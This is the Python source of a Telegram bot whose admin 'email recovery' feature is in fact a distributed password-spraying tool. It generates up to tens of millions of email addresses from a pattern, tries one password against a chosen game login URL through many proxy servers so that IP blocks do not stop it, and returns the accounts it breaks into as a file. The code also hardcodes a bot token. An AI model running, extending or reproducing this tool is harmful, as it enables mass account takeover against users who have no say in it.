import sys
import asyncio

if sys.platform.startswith("win"):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

import os
import time
import requests
import re
import aiohttp
import json
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ===== CONFIG =====
BOT_TOKEN = "8496323687:AAFLhc2UY4Z_afiKNjAFRfpg9i325oiv-UA"

# ===== ADMIN CONFIG =====
ADMIN_ID = 8650959684

USERS_FILE = "users.txt"
SERVERS_FILE = "servers.txt"

# Load allowed users
if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        allowed_users = set(int(x.strip()) for x in f if x.strip())
else:
    allowed_users = set()

# Always allow admin
allowed_users.add(ADMIN_ID)

def save_users():
    with open(USERS_FILE, "w") as f:
        for uid in allowed_users:
            f.write(f"{uid}\n")

# ===== DISTRIBUTED SERVER MANAGEMENT =====
SERVERS_CACHE = []

def load_servers():
    """Load server list from servers.txt"""
    global SERVERS_CACHE
    if os.path.exists(SERVERS_FILE):
        with open(SERVERS_FILE, "r") as f:
            lines = f.readlines()
            for line in lines:
                line = line.strip()
                if line and not line.startswith("#"):
                    # Format: ip:port or url
                    SERVERS_CACHE.append(line)
    
    if not SERVERS_CACHE:
        print("⚠️  No servers configured. Create servers.txt with format:")
        print("http://192.168.1.100:5000")
        print("http://192.168.1.101:5000")

load_servers()

def get_servers():
    """Get all available servers"""
    return SERVERS_CACHE

# ===== ADMIN COMMANDS =====

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("Usage: /add telegramid")
        return

    try:
        user_id = int(context.args[0])

        if user_id in allowed_users:
            await update.message.reply_text("⚠️ User already exists.")
            return

        allowed_users.add(user_id)
        save_users()

        await update.message.reply_text(f"✅ Added user: {user_id}")

    except:
        await update.message.reply_text("❌ Invalid Telegram ID")


async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("Usage: /remove telegramid")
        return

    try:
        user_id = int(context.args[0])

        if user_id == ADMIN_ID:
            await update.message.reply_text("⚠️ Cannot remove admin.")
            return

        if user_id not in allowed_users:
            await update.message.reply_text("⚠️ User not found.")
            return

        allowed_users.remove(user_id)
        save_users()

        # logout session if online
        if user_id in sessions:
            del sessions[user_id]

        await update.message.reply_text(f"🗑 Removed user: {user_id}")

    except:
        await update.message.reply_text("❌ Invalid Telegram ID")


async def bulk_add_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to bulk add users from comma/newline-separated list."""
    if update.effective_user.id != ADMIN_ID:
        return

    bulk_help = """
📋 **Bulk Add Users**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Usage: Send a list of Telegram IDs separated by:
- Commas: `123456,789012,345678`
- New lines: Each ID on a new line
- Spaces: `123456 789012 345678`

Example:
```
/bulkadd
123456789
987654321
555666777
```

Type your list:
"""
    context.user_data['step'] = 'bulk_add'
    await update.message.reply_text(bulk_help, parse_mode="Markdown")


async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not allowed_users:
        await update.message.reply_text("No users.")
        return

    text = "👥 Active Users:\n\n"

    for uid in sorted(allowed_users):
        status = "🟢 Online" if uid in sessions else "⚪ Offline"
        text += f"{uid} - {status}\n"

    await update.message.reply_text(text)


async def status_servers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to check server status"""
    if update.effective_user.id != ADMIN_ID:
        return

    servers = get_servers()
    num_servers = len(servers)
    
    status_text = f"""
🖥️ **Distributed Servers Status**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Configured Servers: **{num_servers}**

**Estimated Speed (99M emails):**
- Concurrent: **{num_servers * 2000:,} requests/batch**
- Speed: **~100K+ emails/sec**
- Time: **~20-30 minutes**

**Servers:**
"""
    for i, server in enumerate(servers[:10], 1):
        status_text += f"{i}. {server}\n"
    
    if num_servers > 10:
        status_text += f"... and {num_servers - 10} more servers\n"
    
    await update.message.reply_text(status_text, parse_mode="Markdown")


# ===== ADMIN RECOVER COMMAND =====
async def admin_recover(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only email recovery command"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized. Admin only.")
        return
    
    game_selection = """
🔐 **ADMIN: Email Recovery (50-Server Distributed)**
━━━━━━━━━━━━━━━━━━━━━━
Enter your game login URL:

Example:
`https://game.com/api/login`
or
`https://game.com/login.php`

Type the full login endpoint URL:
"""
    await update.message.reply_text(game_selection, parse_mode="Markdown")
    context.user_data['step'] = 'admin_recover_url'


# ===== SCRAPING FUNCTIONS =====
def parse_email_pattern(pattern):
    """Parse email patterns like tannercpm(10000)@gmail.com"""
    match = re.match(r'^([a-zA-Z0-9]+)\((\d+)(?:-(\d+))?\)@([\w\.-]+\.\w+)$', pattern)
    if not match:
        return None
    
    base, start, end, domain = match.groups()
    start = int(start)
    end = int(end) if end else start
    
    if start > end:
        start, end = end, start
    
    return base, start, end, domain

async def scrape_login(email, password, login_url, server_url, session=None):
    """
    Scrape game login page via distributed server
    Uses server as proxy to avoid IP blocking
    """
    try:
        # Send request through distributed server
        proxy_url = f"{server_url}/check"
        
        payload = {
            "email": email,
            "password": password,
            "login_url": login_url
        }
        
        if session is None:
            async with aiohttp.ClientSession() as temp_session:
                async with temp_session.post(
                    proxy_url, 
                    json=payload, 
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    data = await resp.json()
        else:
            async with session.post(
                proxy_url, 
                json=payload, 
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                data = await resp.json()
        
        status = data.get("status")
        
        if status == "found":
            return "found", data
        elif status == "not_found":
            return "not_found", None
        elif status == "wrong_password":
            return "wrong_password", None
        else:
            return "error", data.get("error")
            
    except asyncio.TimeoutError:
        return "timeout", None
    except Exception as e:
        return "error", str(e)

async def check_emails_distributed_generator(base, start, end, domain, password, login_url, servers, progress_callback=None):
    """
    DISTRIBUTED SCRAPING: Distributes emails across 50+ servers
    Each server handles concurrent requests
    Total: 50 servers × 2000 concurrent = 100,000 concurrent requests
    
    Speed: ~100K+ emails/second
    99M emails in ~20-30 minutes
    """
    checked = 0
    total = end - start + 1
    found_count = 0
    num_servers = len(servers)
    
    if num_servers == 0:
        print("❌ No servers configured!")
        return
    
    # Distribute range evenly across all servers
    chunk_size = total // num_servers
    
    # Process each server's chunk concurrently
    async def process_server_chunk(server_idx, server_url, chunk_start, chunk_end):
        nonlocal checked, found_count
        
        batch_size = 2000  # Max concurrent per server
        
        # Reuse session for this server
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=2000)) as session:
            for batch_start in range(chunk_start, chunk_end + 1, batch_size):
                batch_end = min(batch_start + batch_size, chunk_end + 1)
                
                # Create concurrent tasks for this batch
                tasks = []
                for i in range(batch_start, batch_end):
                    email = f"{base}{i}@{domain}"
                    tasks.append(scrape_login(email, password, login_url, server_url, session))
                
                # Execute all concurrently (2000 at once per server)
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results immediately
                for i, result in enumerate(results):
                    checked += 1
                    email_num = batch_start + i
                    email = f"{base}{email_num}@{domain}"
                    
                    if isinstance(result, tuple):
                        status = result[0]
                        data = result[1]
                        if status == "found":
                            found_count += 1
                            yield (email, status, data)
                    
                    # Progress callback every 500 checks
                    if progress_callback and checked % 500 == 0:
                        await progress_callback(checked, total, found_count)
    
    # Create tasks for each server's chunk
    async def merge_generators():
        tasks_list = [
            process_server_chunk(
                idx, 
                servers[idx], 
                start + (idx * chunk_size), 
                start + ((idx + 1) * chunk_size) if idx < num_servers - 1 else end
            )
            for idx in range(num_servers)
        ]
        
        # Yield from all generators concurrently
        for gen in tasks_list:
            async for item in gen:
                yield item
    
    async for item in merge_generators():
        yield item

# ===== SESSIONS =====
sessions = {}
user_states = {}

# ===== MENU HELPERS =====
def build_menu_text(user_id):
    """Return a text-based menu depending on login state."""
    if user_id in sessions:
        session_info = sessions[user_id]
        menu_text = f"""
🎮 **TNNR Change Tool Bot** 🎮
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Logged in as:** {session_info['email']}
🎯 **Game:** {session_info['game_name']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Available Options:**
1️⃣ Type: `changemail` - Change your email
2️⃣ Type: `changepass` - Change your password
3️⃣ Type: `logout` - Logout from the bot

What would you like to do?
"""
    else:
        menu_text = """
🎮 **TNNR Change Tool Bot** 🎮
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
You are not logged in.

**Available Options:**
1️⃣ Type: `login` - Login to your game account

What would you like to do?
"""
    return menu_text
    
# ===== ACCESS CHECK =====
def is_allowed(user_id):
    return user_id in allowed_users
    
# ==== START FUNCTION =====

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user_id = update.effective_user.id

    if not is_allowed(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return

    await update.message.reply_text(
        build_menu_text(user_id),
        parse_mode="Markdown"
    )

# ----- MESSAGE HANDLER -----
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip().lower()
    step = context.user_data.get('step')
    
    # ----- ADMIN: BULK ADD USERS -----
    if step == 'bulk_add':
        if user_id != ADMIN_ID:
            return
        
        ids_text = update.message.text.strip()
        
        if ',' in ids_text:
            user_ids = [x.strip() for x in ids_text.split(',')]
        elif '\n' in ids_text:
            user_ids = [x.strip() for x in ids_text.split('\n')]
        else:
            user_ids = ids_text.split()
        
        added = []
        failed = []
        already_exist = []
        
        for uid_str in user_ids:
            try:
                uid = int(uid_str)
                
                if uid in allowed_users:
                    already_exist.append(uid)
                else:
                    allowed_users.add(uid)
                    added.append(uid)
            except ValueError:
                failed.append(uid_str)
        
        save_users()
        
        response = "📊 **Bulk Add Results:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if added:
            response += f"✅ **Added ({len(added)}):** " + ", ".join(map(str, added)) + "\n"
        if already_exist:
            response += f"⚠️ **Already exist ({len(already_exist)}):** " + ", ".join(map(str, already_exist)) + "\n"
        if failed:
            response += f"❌ **Invalid IDs ({len(failed)}):** " + ", ".join(failed) + "\n"
        
        response += f"\n**Total Users:** {len(allowed_users)}"
        
        await update.message.reply_text(response, parse_mode="Markdown")
        context.user_data.clear()
        return
    
    if not is_allowed(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return

    # ----- ADMIN: RECOVER URL INPUT -----
    elif step == 'admin_recover_url':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
        
        login_url = update.message.text.strip()
        
        # Validate URL
        if not login_url.startswith("http"):
            await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
            return
        
        context.user_data['recover_login_url'] = login_url
        context.user_data['step'] = 'admin_recover_pattern'
        
        recover_help = """
📧 **ADMIN: Email Recovery (50-Server Distributed Scraping)**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Enter an email pattern to check:

**Examples:**
- `user(1-1000)@gmail.com` - Checks 1,000 emails
- `user(1000000-99999999)@gmail.com` - Checks 99M emails! 
- `tannercpm(1-100000)@domain.com` - Checks 100K emails

⚡ **DISTRIBUTED SCRAPING (50 SERVERS)**
- 50 servers × 2000 concurrent each
- Total: 100,000 concurrent requests
- Speed: ~100K+ emails/sec
- 99M emails in ~20-30 minutes

Enter your pattern:
"""
        await update.message.reply_text(recover_help, parse_mode="Markdown")
        return

    # ----- ADMIN EMAIL RECOVERY PATTERN -----
    elif step == 'admin_recover_pattern':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
            
        pattern = update.message.text.strip()
        parsed = parse_email_pattern(pattern)
        
        if not parsed:
            await update.message.reply_text("❌ Invalid pattern format. Use: `base(num)@domain.com` or `base(num1-num2)@domain.com`")
            return
        
        base, start, end, domain = parsed
        total = end - start + 1
        
        context.user_data['step'] = 'admin_recover_password_input'
        await update.message.reply_text(f"""
🔐 **Enter Password to Check**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Pattern: `{pattern}`
Range: {total:,} emails ({start:,} - {end:,})

Enter the password to check:
""", parse_mode="Markdown")
        context.user_data['recover_base'] = base
        context.user_data['recover_start'] = start
        context.user_data['recover_end'] = end
        context.user_data['recover_domain'] = domain
        return

    # ----- ADMIN EMAIL RECOVERY PASSWORD INPUT -----
    elif step == 'admin_recover_password_input':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
            
        password = update.message.text.strip()
        
        base = context.user_data['recover_base']
        start = context.user_data['recover_start']
        end = context.user_data['recover_end']
        domain = context.user_data['recover_domain']
        login_url = context.user_data['recover_login_url']
        
        servers = get_servers()
        num_servers = len(servers)
        
        if num_servers == 0:
            await update.message.reply_text("❌ No servers configured! Add servers to servers.txt")
            context.user_data.clear()
            return
        
        total = end - start + 1
        
        start_time = time.time()
        
        progress_msg = await update.message.reply_text(f"""
⚡ **DISTRIBUTED SCRAPING EMAIL RECOVERY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Login URL: **{login_url}**
Pattern: **{base}({start:,}-{end:,})@{domain}**
Total: **{total:,} emails**
Status: **Starting...**

Servers: **{num_servers}**
Concurrency: **{num_servers * 2000:,} requests/batch**
""", parse_mode="Markdown")
        
        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        
        # Open file for streaming results
        filename = f"recovery_distributed_{int(time.time())}.json"
        found_emails = []
        checked_count = 0
        
        # Progress callback
        async def update_progress(checked, total_emails, found):
            nonlocal checked_count
            checked_count = checked
            elapsed = time.time() - start_time
            speed = checked / elapsed if elapsed > 0 else 0
            remaining = (total_emails - checked) / speed if speed > 0 else 0
            
            try:
                await progress_msg.edit_text(f"""
⚡ **DISTRIBUTED SCRAPING EMAIL RECOVERY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Pattern: **{base}({start:,}-{end:,})@{domain}**
Checked: **{checked:,}/{total_emails:,}** ({int(checked/total_emails*100) if total_emails > 0 else 0}%)
Speed: **{speed:.1f} emails/sec**
Found: **{found}**
ETA: **{int(remaining)}s**
Servers: **{num_servers}** (Active)
""", parse_mode="Markdown")
            except:
                pass
        
        # Run distributed check with generator
        async for email, status, data in check_emails_distributed_generator(base, start, end, domain, password, login_url, servers, progress_callback=update_progress):
            found_emails.append({
                "email": email,
                "password": password
            })
        
        elapsed = time.time() - start_time
        
        # Create output file with results
        output_data = {
            "pattern": f"{base}({start:,}-{end:,})@{domain}",
            "total_checked": total,
            "time_seconds": round(elapsed, 2),
            "speed_emails_per_sec": round(total/elapsed, 2) if elapsed > 0 else 0,
            "servers_used": num_servers,
            "found_count": len(found_emails),
            "successful_logins": found_emails
        }
        
        # Save to file
        with open(filename, 'w') as f:
            json.dump(output_data, f, indent=2)
        
        # Send results
        if found_emails:
            results_text = f"""
✅ **RECOVERY COMPLETE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Found: **{len(found_emails)} account(s)** ✅
Time: **{elapsed:.1f}s** ({elapsed/60:.1f} minutes)
Speed: **{total/elapsed:.1f} emails/sec**
Servers: **{num_servers}**

📄 Results saved to file
"""
            await update.message.reply_text(results_text, parse_mode="Markdown")
            
            # Send file
            with open(filename, 'rb') as f:
                await update.message.reply_document(document=f, filename=filename)
        else:
            await update.message.reply_text(f"""
❌ **RECOVERY COMPLETE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No matching accounts found.
Checked: **{total:,}** emails
Time: **{elapsed:.1f}s** ({elapsed/60:.1f} minutes)
Speed: **{total/elapsed:.1f} emails/sec**
Servers: **{num_servers}**
""", parse_mode="Markdown")
        
        context.user_data.clear()
        return

    # ----- UNRECOGNIZED INPUT -----
    else:
        await update.message.reply_text("❓ I didn't understand that. Type `/start` to see available options.", parse_mode="Markdown")

# ===== BOT STARTUP =====
app = Application.builder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("add", add_user))
app.add_handler(CommandHandler("remove", remove_user))
app.add_handler(CommandHandler("bulkadd", bulk_add_users))
app.add_handler(CommandHandler("users", list_users))
app.add_handler(CommandHandler("status", status_servers))
app.add_handler(CommandHandler("recover", admin_recover))
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

print("🚀 Bot is running...")
print(f"Configured Servers: {len(get_servers())}")
if len(get_servers()) == 0:
    print("⚠️  Add servers to servers.txt (format: http://ip:port)")
app.run_polling()
